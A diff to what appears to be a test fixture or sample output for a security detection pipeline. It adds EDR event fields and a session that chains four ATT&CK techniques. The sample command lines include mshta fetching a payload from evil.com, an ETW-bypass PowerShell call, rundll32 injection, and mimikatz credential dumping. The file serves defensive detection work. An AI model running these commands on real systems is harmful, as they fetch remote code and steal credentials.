@@ -16,7 +16,20 @@
             "mapped_by": "DSL:v1.1"
           }
         ],
-        "result": true
+        "result": true,
+        "source_type": "edr",
+        "vendor": "velociraptor",
+        "timestamp": "2025-05-20T14:10:10",
+        "username": "user01",
+        "process_name": "mshta.exe",
+        "command_line": "mshta http://evil.com/payload.hta",
+        "parent_proc": null,
+        "artifact": null,
+        "artifact_frequency": null,
+        "registry_path": null,
+        "role": null,
+        "role_score": 0,
+        "role_explanation": ""
       },
       {
         "event_type_id": "EVT-015",
@@ -32,7 +45,20 @@
             "mapped_by": "DSL:v1.1"
           }
         ],
-        "result": true
+        "result": true,
+        "source_type": "edr",
+        "vendor": "velociraptor",
+        "timestamp": "2025-05-20T14:10:15",
+        "username": "user01",
+        "process_name": "powershell.exe",
+        "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
+        "parent_proc": null,
+        "artifact": null,
+        "artifact_frequency": null,
+        "registry_path": null,
+        "role": null,
+        "role_score": 0,
+        "role_explanation": ""
       },
       {
         "event_type_id": "EVT-016",
@@ -48,7 +74,20 @@
             "mapped_by": "DSL:v1.1"
           }
         ],
-        "result": true
+        "result": true,
+        "source_type": "edr",
+        "vendor": "velociraptor",
+        "timestamp": "2025-05-20T14:10:25",
+        "username": "user01",
+        "process_name": "rundll32.exe",
+        "command_line": "rundll32 my.dll,Inject",
+        "parent_proc": null,
+        "artifact": null,
+        "artifact_frequency": null,
+        "registry_path": null,
+        "role": null,
+        "role_score": 0,
+        "role_explanation": ""
       },
       {
         "event_type_id": "EVT-017",
@@ -64,10 +103,159 @@
             "mapped_by": "DSL:v1.1"
           }
         ],
-        "result": true
+        "result": true,
+        "source_type": "edr",
+        "vendor": "velociraptor",
+        "timestamp": "2025-05-20T14:10:40",
+        "username": "user01",
+        "process_name": "mimikatz.exe",
+        "command_line": "sekurlsa::logonpasswords",
+        "parent_proc": null,
+        "artifact": null,
+        "artifact_frequency": null,
+        "registry_path": null,
+        "role": null,
+        "role_score": 0,
+        "role_explanation": ""
       }
     ],
-    "session": [],
+    "session": [
+      {
+        "session_id": "4d5a1aa8-e8da-4486-9709-a665db013b03",
+        "session_key": "user01::NA::NA",
+        "events": [
+          {
+            "event_type_id": "EVT-013",
+            "event_type": "Remote Code Execution via mshta",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1218.005",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "timestamp": "2025-05-20T14:10:10",
+            "username": "user01",
+            "process_name": "mshta.exe",
+            "command_line": "mshta http://evil.com/payload.hta",
+            "parent_proc": null,
+            "artifact": null,
+            "artifact_frequency": null,
+            "registry_path": null,
+            "role": null,
+            "role_score": 0,
+            "role_explanation": ""
+          },
+          {
+            "event_type_id": "EVT-015",
+            "event_type": "ETW Bypass via PowerShell",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1620",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "timestamp": "2025-05-20T14:10:15",
+            "username": "user01",
+            "process_name": "powershell.exe",
+            "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
+            "parent_proc": null,
+            "artifact": null,
+            "artifact_frequency": null,
+            "registry_path": null,
+            "role": null,
+            "role_score": 0,
+            "role_explanation": ""
+          },
+          {
+            "event_type_id": "EVT-016",
+            "event_type": "Rundll32 Process Injection",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1055",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "timestamp": "2025-05-20T14:10:25",
+            "username": "user01",
+            "process_name": "rundll32.exe",
+            "command_line": "rundll32 my.dll,Inject",
+            "parent_proc": null,
+            "artifact": null,
+            "artifact_frequency": null,
+            "registry_path": null,
+            "role": null,
+            "role_score": 0,
+            "role_explanation": ""
+          },
+          {
+            "event_type_id": "EVT-017",
+            "event_type": "Credential Access via Mimikatz",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1003",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "timestamp": "2025-05-20T14:10:40",
+            "username": "user01",
+            "process_name": "mimikatz.exe",
+            "command_line": "sekurlsa::logonpasswords",
+            "parent_proc": null,
+            "artifact": null,
+            "artifact_frequency": null,
+            "registry_path": null,
+            "role": null,
+            "role_score": 0,
+            "role_explanation": ""
+          }
+        ],
+        "start_time": "2025-05-20T14:10:10",
+        "end_time": "2025-05-20T14:10:40",
+        "role_sequence": "",
+        "role_summary": {
+          "entrypoint": 0,
+          "pivotable": 0,
+          "expansion": 0
+        },
+        "ttp_chain": "T1218.005 → T1620 → T1055 → T1003",
+        "unique_ttp_count": 4,
+        "confidence": 0.0,
+        "summary": "4 unique TTPs chained",
+        "schema_version": "v0.1"
+      }
+    ],
     "policy": [
       {
         "policy_id": "POL-001",
